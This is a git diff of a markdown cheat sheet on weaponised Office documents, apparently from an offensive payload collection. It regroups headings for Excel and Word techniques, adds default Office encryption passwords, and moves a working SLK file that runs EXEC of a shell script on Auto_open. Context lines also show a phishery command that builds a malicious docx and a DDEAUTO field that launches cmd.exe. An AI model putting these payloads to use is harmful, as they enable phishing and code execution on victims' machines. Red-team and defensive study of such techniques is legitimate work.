@@ -2,33 +2,55 @@
 
 ## Summary
 
-* [XLSM - Hot Manchego](#xlsm---hot-manchego)
-* [XLS - Macrome](#xls---macrome)
-* [XLM Excel 4.0 - SharpShooter](#xlm-excel-40---sharpshooter)
-* [XLM Excel 4.0 - EXCELntDonut](#xlm-excel-40---excelntdonut)
-* [XLM Excel 4.0 - EXEC](#xlm-excel-40---exec)
-* [DOCM - Metasploit](#docm---metasploit)
-* [DOCM - Download and Execute](#docm---download-and-execute)
-* [DOCM - Macro Creator](#docm---macro-creator)
-* [DOCM - C# converted to Office VBA macro](#docm---c-converted-to-office-vba-macro)
-* [DOCM - VBA Wscript](#docm---vba-wscript)
-* [DOCM - VBA Shell Execute Comment](#docm---vba-shell-execute-comment)
-* [DOCM - VBA Spawning via svchost.exe using Scheduled Task](#docm---vba-spawning-via-svchostexe-using-scheduled-task)
-* [DCOM - WMI COM functions (VBA AMSI)](#docm---wmi-com-functions)
-* [DOCM - winmgmts](#docm---winmgmts)
-* [DOCM - Macro Pack - Macro and DDE](#docmxlm---macro-pack---macro-and-dde)
-* [DOCM - BadAssMacros](#docm---badassmacros)
-* [DOCM - CACTUSTORCH VBA Module](#docm---cactustorch-vba-module)
-* [DOCM - MMG with Custom DL + Exec](#docm---mmg-with-custom-dl--exec)
-* [VBA Obfuscation](#vba-obfuscation)
-* [VBA Purging](#vba-purging)
-    * [OfficePurge](#officepurge)
-    * [EvilClippy](#evilclippy)
-* [VBA AMSI](#vba-amsi)
-* [VBA - Offensive Security Template](#vba---offensive-security-template)
-* [DOCX - Template Injection](#docx---template-injection)
-* [DOCX - DDE](#docx---dde)
+* [Office Products Features](#office-products-features)
+* [Office Default Passwords](#office-default-passwords)
+* [Excel](#excel)
+    * [XLSM - Hot Manchego](#xlsm---hot-manchego)
+    * [XLS - Macrome](#xls---macrome)
+    * [XLM Excel 4.0 - SharpShooter](#xlm-excel-40---sharpshooter)
+    * [XLM Excel 4.0 - EXCELntDonut](#xlm-excel-40---excelntdonut)
+    * [XLM Excel 4.0 - EXEC](#xlm-excel-40---exec)
+    * [SLK - EXEC](#slk---exec)
+* [Word](#word)
+    * [DOCM - Metasploit](#docm---metasploit)
+    * [DOCM - Download and Execute](#docm---download-and-execute)
+    * [DOCM - Macro Creator](#docm---macro-creator)
+    * [DOCM - C# converted to Office VBA macro](#docm---c-converted-to-office-vba-macro)
+    * [DOCM - VBA Wscript](#docm---vba-wscript)
+    * [DOCM - VBA Shell Execute Comment](#docm---vba-shell-execute-comment)
+    * [DOCM - VBA Spawning via svchost.exe using Scheduled Task](#docm---vba-spawning-via-svchostexe-using-scheduled-task)
+    * [DCOM - WMI COM functions (VBA AMSI)](#docm---wmi-com-functions)
+    * [DOCM - winmgmts](#docm---winmgmts)
+    * [DOCM - Macro Pack - Macro and DDE](#docmxlm---macro-pack---macro-and-dde)
+    * [DOCM - BadAssMacros](#docm---badassmacros)
+    * [DOCM - CACTUSTORCH VBA Module](#docm---cactustorch-vba-module)
+    * [DOCM - MMG with Custom DL + Exec](#docm---mmg-with-custom-dl--exec)
+    * [VBA Obfuscation](#vba-obfuscation)
+    * [VBA Purging](#vba-purging)
+        * [OfficePurge](#officepurge)
+        * [EvilClippy](#evilclippy)
+    * [VBA AMSI](#vba-amsi)
+    * [VBA - Offensive Security Template](#vba---offensive-security-template)
+    * [DOCX - Template Injection](#docx---template-injection)
+    * [DOCX - DDE](#docx---dde)
 * [References](#references)
+
+## Office Products Features
+
+![Overview of features supported by different Office products](https://www.securesystems.de/images/blog/offphish-phishing-revisited-in-2023/Office_documents_feature_overview.png)
+
+
+## Office Default Passwords
+
+By default, Excel does not set a password when saving a new file. However, some older versions of Excel had a default password that was used if the user did not set a password themselves. The default password was "`VelvetSweatshop`", and it could be used to open any file that did not have a password set.
+
+> If the user has not supplied an encryption password and the document is encrypted, the default encryption choice using the techniques specified in section 2.3 MUST be the following password: "`\x2f\x30\x31\x48\x61\x6e\x6e\x65\x73\x20\x52\x75\x65\x73\x63\x68\x65\x72\x2f\x30\x31`". - [2.4.2.3 Binary Document Write Protection Method 3](https://learn.microsoft.com/en-us/openspecs/office_file_formats/ms-offcrypto/57fc02f0-c1de-4fc6-908f-d146104662f5)
+
+| Product    | Password         | Supported Formats |
+|------------|------------------|-------------------|
+| Excel      | VelvetSweatshop  | all Excel formats |
+| PowerPoint | 01Hannes Ruescher/01 | .pps .ppt     |
+
 
 ## XLSM - Hot Manchego 
 
@@ -151,6 +173,18 @@ XLM: https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f13
     ```
 4. Rename cell to **Auto_open**
 5. Hide your macro worksheet by a right mouse click on the sheet name **Macro1** and selecting **Hide**
+
+
+## SLK - EXEC
+
+```ps1
+ID;P
+O;E
+NN;NAuto_open;ER101C1;KOut Flank;F
+C;X1;Y101;K0;EEXEC("c:\shell.cmd")
+C;X1;Y102;K0;EHALT()
+E
+```
 
 
 ## DOCM - Metasploit
@@ -633,16 +667,6 @@ $ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx
 * Right Click > Toggle Field Code
 * `{ DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" }`
 
-## SLK - Excel
-
-```ps1
-ID;P
-O;E
-NN;NAuto_open;ER101C1;KOut Flank;F
-C;X1;Y101;K0;EEXEC("c:\shell.cmd")
-C;X1;Y102;K0;EHALT()
-E
-```
 
 ## References
 
